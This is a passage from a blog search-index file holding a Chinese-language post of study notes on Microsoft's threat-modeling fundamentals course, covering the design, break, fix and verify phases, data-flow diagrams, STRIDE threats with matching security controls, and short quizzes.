<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>威胁建模安全基础知识</title>
      <link href="2021/04/04/thread-modeling/"/>
      <url>2021/04/04/thread-modeling/</url>
      
        <content type="html"><![CDATA[<p>实习过程中零零碎碎学了一些，但还没系统学过，发现微软有个挺全面的，打算系统学习一波~</p><p><a href="https://docs.microsoft.com/zh-cn/learn/paths/tm-threat-modeling-fundamentals/">https://docs.microsoft.com/zh-cn/learn/paths/tm-threat-modeling-fundamentals/</a></p><p>感觉讲的特别好…所以就直接索性一边看一边补充的 <strong>copy</strong> 下来了</p><h2 id="威胁建模简介"><a href="#威胁建模简介" class="headerlink" title="威胁建模简介"></a>威胁建模简介</h2><p>威胁建模是一种有助于保护系统、应用程序、网络和服务的有效技术。它可帮助你在开发生命周期的早期确定潜在的威胁和降低风险策略。</p><p>威胁建模使用以图形形式演示系统工作方式的数据流关系图。之后，它应用一个框架来帮助你发现和修复安全问题。</p><p>如果未首先建立威胁模型而发布系统，该系统将使你的客户和组织面临风险。</p><div class="note info"><p>简单起见，此学习路径将系统、应用程序和服务统称为系统。</p></div><h3 id="何时使用威胁建模"><a href="#何时使用威胁建模" class="headerlink" title="何时使用威胁建模"></a>何时使用威胁建模</h3><p>在设计新系统或更新现有系统时，可使用威胁建模。 示例包括：</p><ul><li>创建新的 Azure 微服务，用于报告组织的云资源使用情况以便进行预算</li><li>设计公共 API 以向客户提供对数据的访问权限</li><li>向现有应用程序添加新功能</li></ul><h3 id="谁可以进行威胁建模"><a href="#谁可以进行威胁建模" class="headerlink" title="谁可以进行威胁建模"></a>谁可以进行威胁建模</h3><p>只要了解系统如何工作，并且对安全性有基本的理解，任何人都可以进行威胁建模。 此技术可应用于任何：</p><ul><li>软件交付方式（ 如 <a href="http://www.ruanyifeng.com/blog/2019/03/agile-development.html">敏捷型</a> 或 <a href="https://zhuanlan.zhihu.com/p/29783716">瀑布型</a> ，好多瀑布型介绍很繁琐，直接找了个对比的）</li><li>部署节奏（每小时、每月或每年）</li></ul><h3 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h3><p>在本模块，你将了解威胁建模的四个概括性步骤，并能够学得以下内容：</p><ul><li>了解明确要求和假设以帮助创建数据流关系图的重要性</li><li>了解可帮助你查找系统中安全问题的框架</li><li>了解有助于减轻或消除潜在威胁的安全控制类别</li><li>重点介绍在部署之前验证假设、要求和修复的重要性</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h2 id="模块1-威胁建模阶段"><a href="#模块1-威胁建模阶段" class="headerlink" title="模块1 | 威胁建模阶段"></a>模块1 | 威胁建模阶段</h2><p>只要了解系统工作原理，并具有信息安全知识，任何人都可以使用威胁建模技术。</p><p>此方法分为四个不同的阶段，每个阶段都包含重要步骤，可帮助你创建数据流关系图并对其进行分析，以发现潜在的威胁。</p><p><img src="/img/thread-modeling/threat-modeling-steps.png" class="lazyload" data-srcset="/img/thread-modeling/threat-modeling-steps.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="threat-modeling-steps"></p><table><thead><tr><th>阶段</th><th>标题</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>设计</td><td>明确系统的所有要求，并创建数据流关系图</td></tr><tr><td>2</td><td>中断</td><td>将威胁建模框架应用到数据流关系图</td></tr><tr><td>3</td><td>修复</td><td>确定如何正确组合安全控制来解决每个问题</td></tr><tr><td>4</td><td>验证</td><td>验证是否满足了要求</td></tr></tbody></table><div class="note warning"><p>本模块(1) 中的单元将较为概括地介绍重要的威胁建模概念，本文 <a href="#%E6%A8%A1%E5%9D%972-%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B5%81%E5%85%B3%E7%B3%BB%E5%9B%BE%E5%85%83%E7%B4%A0%E5%88%9B%E5%BB%BA%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B">模块2</a> 开始将详细讨论这些概念。</p></div><h3 id="步骤1-设计"><a href="#步骤1-设计" class="headerlink" title="步骤1 - 设计"></a>步骤1 - 设计</h3><p>设计阶段是进行威胁建模活动的基础。 你需要尽可能多地收集关于你所构建的内容及所用资源的数据。</p><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><ul><li>清楚地了解系统的工作原理</li><li>列出系统使用的每个服务</li><li>枚举有关环境和默认安全配置的所有假设</li><li>使用正确的上下文深度级别创建数据流关系图</li></ul><div class="note warning"><p>如果不完成此阶段，你可能会忽略系统的重要安全设计注意事项，这可能会使你的客户面临风险。</p></div><h4 id="提出有关系统的问题"><a href="#提出有关系统的问题" class="headerlink" title="提出有关系统的问题"></a>提出有关系统的问题</h4><p>尽可能多地提出有关系统的问题。 可以考虑以下问题：</p><table><thead><tr><th>区域</th><th>问题</th></tr></thead><tbody><tr><td><strong>系统说明</strong></td><td>系统的功能是什么？ 服务处理的业务流程是什么？ 是否明确定义了这些流程？</td></tr><tr><td><strong>系统环境</strong></td><td>系统是在云中还是在本地构建的？ 它将在哪个 OS 上构建？ 是否将使用容器？ 系统是应用程序、服务还是其他完全不同的东西？</td></tr><tr><td><strong>方案</strong></td><td>用户将如何使用系统？ 如何不使用系统？</td></tr><tr><td><strong>权限</strong></td><td>系统是否有脚本执行、数据或硬件访问要求？ 如果有，是哪些要求？</td></tr><tr><td><strong>云提供商</strong></td><td>系统将使用哪个云提供商？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？</td></tr><tr><td><strong>操作系统</strong></td><td>系统将使用哪种操作系统？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？</td></tr><tr><td><strong>第一方和第三方</strong></td><td>系统将使用哪些第一方和第三方服务？ 它们提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？</td></tr><tr><td><strong>帐户</strong></td><td>系统中将使用哪些帐户类型，例如用户和管理员？ 这些帐户是本地帐户还是云帐户？ 它们需要哪些访问权限？为什么？</td></tr><tr><td><strong>标识和访问控制</strong></td><td>系统将如何帮助保护这些帐户？ 它会依赖 Azure Active Directory (Azure AD) 吗？ 它会使用访问控制列表 (ACL)、多重身份验证 (MFA) 和会话控制等功能吗？</td></tr><tr><td><strong>令牌和会话</strong></td><td>系统会处理 SOAP API 或 REST API 之类的请求吗？ 它将如何处理不同的会话？</td></tr><tr><td><strong>旁路</strong></td><td>系统是否使用或需要后门？ 如果需要，它将如何工作？</td></tr><tr><td><strong>记录、监视和备份</strong></td><td>系统使用什么机制来记录安全事件、监视异常和备份系统数据？ 它会捕获哪些事件类型？</td></tr><tr><td><strong>网络</strong></td><td>将使用哪些入侵检测和保护系统？ 如何对通信进行加密？</td></tr><tr><td><strong>数据</strong></td><td>系统将创建或处理哪种类型的数据？ 数据分类类型是什么？ 系统如何信任数据源？ 它将如何分析数据？ 预期的输入和输出行为是什么？ 如何处理验证？ 如何在所有状态下对数据进行加密？</td></tr><tr><td><strong>机密管理</strong></td><td>系统如何处理密钥、证书和凭据？</td></tr></tbody></table><div class="note warning"><p>上面列出的内容很广泛，但并不详尽。 与你的同事和安全团队联系，以明确系统的所有相关上下文。</p></div><div class="note info"><p>如果你有专门的安全团队，请与他们安排白板会议以进行初始设计。 它将节省相当长的时间。</p></div><h4 id="创建数据流关系图"><a href="#创建数据流关系图" class="headerlink" title="创建数据流关系图"></a>创建数据流关系图</h4><p>使用答案创建数据流关系图。 它显示了数据生命周期中每个阶段的数据，包括信任区中的更改。 示例包括：</p><ul><li>用户登录到 Azure 中托管的 Web 应用程序以访问数据</li><li>管理员更改 Web 应用程序使用的弹性资源的默认安全配置</li><li>自动化的每日脚本，用于监视 Web 应用程序的活动日志并通知管理员任何异常情况</li></ul><p>Microsoft 工程团队需要提交数据流关系图，这是其安全合规性要求。 这些关系图有助于进行与安全性相关的探讨。</p><h4 id="图解工具"><a href="#图解工具" class="headerlink" title="图解工具"></a>图解工具</h4><p>Microsoft 工程师建议使用现在提供的两种工具之一：</p><ul><li>Threat Modeling Tool<ul><li>在线安装版，<a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</a></li><li>离线安装版，<a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">https://www.microsoft.com/en-us/download/details.aspx?id=49168</a> （2016）</li><li>想装其他离线版本的，Guguru 一下 <u>microsoft threat modeling tool offline installer</u> 就好了</li></ul></li><li>Visio，（要钱的 打扰了</li></ul><h4 id="关系图元素"><a href="#关系图元素" class="headerlink" title="关系图元素"></a>关系图元素</h4><p>数据流关系图显示了给定系统中的数据流。 <strong>它通常以用户或数据存储的请求开始，以数据存储或 <a href="https://www.elsevier.com/solutions/analytical-services">Analytics Services</a> 结束</strong>。 数据流关系图使用不同的形状来指示它们所表示的元素。</p><table><thead><tr><th align="left">元素</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">接收、修改输入或将输入重定向到输出的任务，如 Web 服务。</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。</td></tr><tr><td align="left">外部实体</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">直接控制之外的任务、实体或数据存储，如用户和第三方 API。</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。</td></tr><tr><td align="left">信任边界</td><td align="left"><img src="/img/thread-modeling/trust-boundary-box50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-box50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-box50"><img src="/img/thread-modeling/trust-boundary-line50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-line50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-line50"></td><td align="left">信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。</td></tr></tbody></table><p>数据流关系图元素还需要上下文，以帮助人们了解如何在系统中的使用和保护它们。</p><h4 id="数据流图标中应包含的信息量"><a href="#数据流图标中应包含的信息量" class="headerlink" title="数据流图标中应包含的信息量"></a>数据流图标中应包含的信息量</h4><p>数据流关系图中包含的信息量取决于几个关键因素：</p><table><thead><tr><th align="left">因素</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">正在构建的系统类型</td><td align="left">如果系统不处理敏感数据或仅在内部使用，则它可能比面向外部的系统需要更少的上下文</td></tr><tr><td align="left">安全团队所需的上下文</td><td align="left">安全团队在威胁模型中的目标非常精确。 与安全团队交流，确认所需的层次</td></tr></tbody></table><p>如果未能包含正确的上下文，将导致安全检查不完整、系统存在潜在的风险。</p><h4 id="关系图层次"><a href="#关系图层次" class="headerlink" title="关系图层次"></a>关系图层次</h4><p>为了帮助你了解要包含的信息量，请在以下四个上下文层次之间进行选择：</p><table><thead><tr><th align="left">层次</th><th align="left">标题</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">系统</td><td align="left">任何系统的基础。 数据流关系图包含系统的主要部分，并提供足够的上下文，可帮助你了解其工作原理及彼此交互方式。</td></tr><tr><td align="left">1</td><td align="left">流程</td><td align="left">使用额外的数据流关系图，关注系统每个部分的数据流关系图。 用于每个系统，尤其是处理敏感数据的系统。 此层的上下文应有助于确定威胁以及更有效地降低或消除风险的方法。</td></tr><tr><td align="left">2</td><td align="left">子过程</td><td align="left">关注系统中某一部分的每个次级部分的数据流关系图。 用于关键的系统。 示例包括适用于安全环境的系统、处理高度敏感数据的系统或包含高风险评级的系统。</td></tr><tr><td align="left">3</td><td align="left">更详细</td><td align="left">关注高度关键的内核级系统。 数据流关系图详细描述每个子过程。</td></tr></tbody></table><div class="note info"><p>大多数数据流关系图应同时包含第 0 层和第 1 层。 与安全团队交流，确认所需的层次深度。</p></div><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li>Threat Modeling Tool<ul><li>在线安装版，<a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</a></li><li>离线安装版，<a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">https://www.microsoft.com/en-us/download/details.aspx?id=49168</a> （2016）</li><li>想装其他离线版本的，Guguru 一下 <u>microsoft threat modeling tool offline installer</u> 就好了</li></ul></li><li>Visio，（要钱的 打扰了</li></ul><h4 id="知识检查"><a href="#知识检查" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>设计阶段要进行哪些工作？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 你知道系统的工作方式。 还可以确定从云提供商和集成服务继承的安全要求、保证或差距</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 此时不必研究所有安全保证、假设和差距，唯一的任务就是创建数据流关系图</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 在创建数据流关系图之前，确定并解决与系统相关的所有安全问题</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 在创建数据流关系图之前，请尽可能收集有关系统的上下文。B. 在设计阶段较早收集尽可能多的上下文，你就可以做出明智的决策以更好地保护系统。C. 在设计阶段之后的中断和修复阶段执行创建关系图的任务。</psw></p><h3 id="步骤2-中断"><a href="#步骤2-中断" class="headerlink" title="步骤2 - 中断"></a>步骤2 - 中断</h3><p>在中断阶段，<strong>需使用数据流关系图查找针对系统的潜在威胁</strong>。 此过程使用威胁建模框架，以帮助你查找最常见的威胁和防范威胁的方法。</p><h4 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h4><ul><li>选择以 “保护系统” 或 “了解攻击者” 为核心的方法 （可参考模块4了解这两种方法）</li><li>使用 <a href="https://zh.wikipedia.org/wiki/STRIDE">STRIDE</a> 框架识别常见威胁（STRIDE威胁模型几乎可以涵盖目前绝大部分安全问题），即<ul><li>欺骗（<strong>S</strong>poofing）</li><li>篡改（<strong>T</strong>ampering）</li><li>否认（<strong>R</strong>epudiation）</li><li>资讯泄露（<strong>I</strong>nformation disclosure），可能是隐私泄露或是资料外泄</li><li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A">阻断服务攻击</a>（<strong>D</strong>enial of service）</li><li><a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87">特权提升</a>（<strong>E</strong>levation of privilege</li></ul></li></ul><div class="note warning"><p>如果不完成此阶段，就不会发现系统中的潜在威胁，这可能会导致未来出现违规现象。</p></div><h4 id="确定方法侧重点"><a href="#确定方法侧重点" class="headerlink" title="确定方法侧重点"></a>确定方法侧重点</h4><p>首先，选择是要找到保护系统的方法，还是想要尽可能地了解攻击者及其动机。 示例包括：</p><table><thead><tr><th align="left">侧重点</th><th align="left">可以查找的内容示例</th></tr></thead><tbody><tr><td align="left">系统</td><td align="left">发现用户与系统之间的未加密连接存在问题。</td></tr><tr><td align="left">攻击者</td><td align="left">进一步了解方法、动机和强化系统入口点的方法。</td></tr><tr><td align="left">资产</td><td align="left">基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。</td></tr></tbody></table><div class="note info"><p>Microsoft 产品工程师主要致力于保护系统。 渗透测试团队两者兼顾。</p></div><h4 id="选择威胁框架"><a href="#选择威胁框架" class="headerlink" title="选择威胁框架"></a>选择威胁框架</h4><p>接下来，选择一个框架，帮助生成系统中的潜在威胁。 Microsoft 通常使用 <a href="https://zh.wikipedia.org/wiki/STRID">STRIDE</a>（六个主要威胁类别的首字母缩写）提供广泛但不完整的威胁列表。</p><p>此框架可帮助你提出有关系统的几个重要问题：</p><table><thead><tr><th align="left">威胁</th><th align="left">定义</th><th align="left">问题</th><th align="left">威胁示例</th></tr></thead><tbody><tr><td align="left">欺骗</td><td align="left">攻击者冒充某人或某物</td><td align="left">通信的双方是否都通过了身份验证？</td><td align="left">通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限。</td></tr><tr><td align="left">篡改</td><td align="left">攻击者在未经授权的情况下更改数据</td><td align="left">如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？</td><td align="left">通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息。</td></tr><tr><td align="left">否认性</td><td align="left">攻击者声称尚未执行任何操作</td><td align="left">每个操作是否可以绑定到标识？</td><td align="left">声称没有删除数据库记录。</td></tr><tr><td align="left">信息泄露</td><td align="left">攻击者看到了不应看到的数据</td><td align="left">如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？</td><td align="left">访问安全控制较弱的未授权文档和文件夹。</td></tr><tr><td align="left">拒绝服务</td><td align="left">攻击者使你的系统崩溃</td><td align="left">系统中是否存在资源受限的区域？</td><td align="left">向网络发送大量请求。</td></tr><tr><td align="left">权限提升</td><td align="left">攻击者未经授权而可访问数据</td><td align="left">如何得知某人可以执行此操作？</td><td align="left">利用输入处理逻辑或内存中的弱点来提取数据。</td></tr></tbody></table><h4 id="知识检查-1"><a href="#知识检查-1" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>中断阶段要进行哪些工作？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 通过相关框架选择重点领域，以系统地识别系统中的潜在威胁。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 通过相关框架选择重点领域，以系统地识别可以应用到系统的解决方案。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 安全团队开会讨论，选择重点领域和相关框架，以系统地识别系统中的潜在威胁。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 在使用 STRIDE 查找潜在威胁时，请关注系统或攻击者。B. 此任务属于阶段 3 - 修复阶段。C. 在大多数情况下，可以选择与安全团队开会讨论，但不强制要求这么做（除非组织有相关要求）。</psw></p><h3 id="步骤3-修复"><a href="#步骤3-修复" class="headerlink" title="步骤3 - 修复"></a>步骤3 - 修复</h3><p>在修复阶段，需要决定如何处理所有威胁。 每个 STRIDE 威胁都对应到一项或多项安全控制，这些控制措施提供不同的功能和类型供你选择。</p><h4 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h4><ul><li>根据<strong>优先级框架或安全 bug 栏衡量每个威胁的优先级</strong></li><li>在 bug 管理服务中将每个威胁作为任务或工作项进行跟踪</li><li>生成对应于 STRIDE 威胁的安全控制建议</li><li>选择一项或多项安全控制类型和功能来应对每个威胁</li><li>解决任务</li></ul><div class="note warning"><p>如果不完成此阶段，就找不到安全控制来帮助降低风险或正确跟踪每个威胁。</p></div><h4 id="设置威胁跟增工作流"><a href="#设置威胁跟增工作流" class="headerlink" title="设置威胁跟增工作流"></a>设置威胁跟增工作流</h4><h5 id="确定威胁的优先级"><a href="#确定威胁的优先级" class="headerlink" title="确定威胁的优先级"></a>确定威胁的优先级</h5><p>首先，根据优先级框架或安全 bug 栏来衡量每个威胁。 此过程可帮助你计划资源来解决对组织而言更重要的问题。</p><p>此过程使用三个关键变量：</p><table><thead><tr><th align="left">变量</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>影响</strong></td><td align="left">使用 STRIDE 类别分配影响。</td></tr><tr><td align="left"><strong>严重性</strong></td><td align="left">使用内部 bug 栏或优先级框架来分配最坏情况下的严重性。</td></tr><tr><td align="left"><strong>风险</strong></td><td align="left">对安全控制有效性和实现成本进行计算。</td></tr></tbody></table><div class="note info"><p>Microsoft 工程师使用内部安全 bug 栏，为威胁分配“严重”、“重要”、“中等”、“低”或“信息”严重性等级。 请咨询安全团队，确认如何确定问题的优先级。</p></div><h5 id="创建任务"><a href="#创建任务" class="headerlink" title="创建任务"></a>创建任务</h5><p>接下来，在 Azure DevOps Services 等 <strong>bug 管理解决方案</strong>中添加每个威胁。 部分优点包括：</p><ul><li>进一步确定问题责任人</li><li>有效跟踪历史记录</li><li>让你能够使用标准化模板来进行优先级和解决方案演练</li></ul><h4 id="评估威胁有效性和成本"><a href="#评估威胁有效性和成本" class="headerlink" title="评估威胁有效性和成本"></a>评估威胁有效性和成本</h4><p>查看对应于 STRIDE 威胁的每项安全控制建议。 记下最有效和成本最低的建议。 以下是一些示例：</p><table><thead><tr><th align="left">威胁</th><th align="left">安全控制</th><th align="left">安全控制示例</th></tr></thead><tbody><tr><td align="left"><strong>欺骗</strong></td><td align="left">身份验证</td><td align="left">发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性。</td></tr><tr><td align="left"><strong>篡改</strong></td><td align="left">完整性</td><td align="left">验证输入以防止处理恶意有效负载和错误处理意外行为。</td></tr><tr><td align="left"><strong>否认性</strong></td><td align="left">不可否认性</td><td align="left">创建和保护包含用户操作和时间戳的安全日志。</td></tr><tr><td align="left"><strong>信息泄露</strong></td><td align="left">保密性</td><td align="left">应用访问控制列表，以确保合适的用户可以访问适当的数据。</td></tr><tr><td align="left"><strong>拒绝服务</strong></td><td align="left">可用性</td><td align="left">使用弹性资源管理不断增加或减少的使用量。</td></tr><tr><td align="left"><strong>权限提升</strong></td><td align="left">授权</td><td align="left">使用最少的访问量运行服务。</td></tr></tbody></table><div class="note info"><p>可能有这样的安全控制，可以同时减轻或完全消除多个威胁。 例如，使用 SSL/TLS 创建安全传输通道，以帮助防止恶意数据修改或泄露。</p></div><h4 id="安全控制措施类型和功能"><a href="#安全控制措施类型和功能" class="headerlink" title="安全控制措施类型和功能"></a>安全控制措施类型和功能</h4><p>安全控制具有不同的类型和功能。 结合使用时，它们有助于保护系统的安全，并创建多个安全保护层，也称为深层防御。</p><p>你可以选择一种或多种安全控制类型：</p><ul><li>物理类型，如摄像头</li><li>技术类型，如加密</li><li>管理类型，如策略</li></ul><p>它们可能有一项或多项安全控制功能：</p><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>预防</strong></td><td align="left">降低威胁的概率或影响，如防火墙。</td></tr><tr><td align="left"><strong>检测</strong></td><td align="left">识别发生的攻击，如监视。</td></tr><tr><td align="left"><strong>纠正</strong></td><td align="left">控制系统如何响应其受到的攻击，如系统修补程序。</td></tr><tr><td align="left"><strong>恢复</strong></td><td align="left">从攻击中恢复系统，如备份。</td></tr><tr><td align="left"><strong>阻碍</strong></td><td align="left">阻止攻击者访问系统，如最低权限。</td></tr></tbody></table><h4 id="为每个问题添加安全控制详细信息"><a href="#为每个问题添加安全控制详细信息" class="headerlink" title="为每个问题添加安全控制详细信息"></a>为每个问题添加安全控制详细信息</h4><p>在 bug 管理解决方案中为每个问题添加详细信息，然后使用以下其中一个解决方案解决各个问题。 这在不同组织之间存在略微差异：</p><table><thead><tr><th align="left">解决方案</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>减轻</strong></td><td align="left">将通过 Bug 修复或重新设计来解决问题，以减轻或消除威胁影响和严重性。</td></tr><tr><td align="left"><strong>转移</strong></td><td align="left">由其他系统或团队处理问题。</td></tr><tr><td align="left"><strong>避免</strong></td><td align="left">去除系统中包含问题的部分。</td></tr><tr><td align="left"><strong>接受</strong></td><td align="left">没有解决方案，将接受风险。 需要经授权的风险决策者的批准，其中决策者可能取决于威胁的严重性。 严重威胁可能需要高级领导的批准，而深层防御风险可能需要高级工程师批准。 与你的团队交流以获得战略指导。</td></tr></tbody></table><h4 id="知识检查-2"><a href="#知识检查-2" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>修复阶段要进行哪些工作？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 在部署系统之前验证所有修补程序。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 在这一阶段，你将生成并验证一系列安全控制，并设置其优先级，以减轻或消除风险。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 此时，选择框架以帮助生成潜在的威胁。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 属于步骤 4 - 验证阶段。B. psw 每个威胁都对应到一个可降低或消除风险的安全控制。 根据组织的安全风险惯例，确定这些威胁的优先级并进行跟踪。C. 此任务属于步骤 2 - 中断阶段。</psw></p><h3 id="步骤4-验证"><a href="#步骤4-验证" class="headerlink" title="步骤4 - 验证"></a>步骤4 - 验证</h3><p>验证阶段是威胁建模过程的最后一步，通常发生在部署系统之前。 它涉及到确保满足要求、验证假设以及准备好安全控制。</p><h4 id="目标-3"><a href="#目标-3" class="headerlink" title="目标"></a>目标</h4><ul><li>确认系统满足所有新旧安全要求</li><li>配置云提供商、操作系统和组件以满足安全要求</li><li>确保使用正确的安全控制解决所有问题</li><li>在部署前对系统进行手动和自动验证</li></ul><div class="note warning"><p>如果不完成此阶段，就无法验证是否已成功完成安全工作。</p></div><h4 id="验证要求和设置默认值"><a href="#验证要求和设置默认值" class="headerlink" title="验证要求和设置默认值"></a>验证要求和设置默认值</h4><p>首先，验证是否满足第一阶段创建的所有要求。</p><p>示例：</p><ul><li>网络安全计划</li><li>机密管理解决方案实施</li><li>日志记录和监视系统</li><li>标识和访问控制</li></ul><p>然后，确保云提供商、操作系统和组件的默认配置设置已更改，可满足所有安全要求。</p><p>示例：</p><ul><li>启用 Azure SQL 数据库透明数据加密以保护磁盘上的数据</li><li>使用基于角色的访问控制 (RBAC) 向用户、组和应用程序分配权限</li><li>跨所有配置文件启用 Windows 防火墙</li></ul><p>应解决 bug 管理解决方案中记录的所有问题并验证所有修补程序。</p><h4 id="执行验证"><a href="#执行验证" class="headerlink" title="执行验证"></a>执行验证</h4><p>最后一部分涉及运行手动和自动验证。 在 Microsoft，部署系统之前必须对其进行验证，验证过程可能包含自动扫描程序、代码评审和渗透测试。 可以在每次部署之前或隔一定的时间（如每 6 - 12 个月）强制执行该过程。</p><p>如果以下任一问题的答案为“是”，最好设置较短的验证周期：</p><ul><li>我的系统会在部使用吗？</li><li>它可以处理机密数据吗？</li><li>我必须遵守某些规定吗？</li><li>我的组织是否要求实施其他安全保护过程，以应对隐私影响、运营风险或开发要求？</li></ul><h4 id="知识检查-3"><a href="#知识检查-3" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>验证阶段要进行哪些工作？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 实施一系列适用的安全控制，以减轻或消除风险。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 在将代码推送到暂存分支进行部署之前，需要对其进行手动检查。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 针对先前产生的威胁手动或自动验证系统，以验证安全控制是否降低或消除了风险。</p>            </div><p>参考答案：<psw>== C ==</psw></p><p>解释：<psw>A. 此任务属于步骤 3 - 修复阶段。B. 此答案更适用于操作方面，而不是威胁建模过程。C. 此阶段的主要工作是验证修复、假设和满足要求。</psw></p><h3 id="小结"><a href="#小结" class="headerlink" 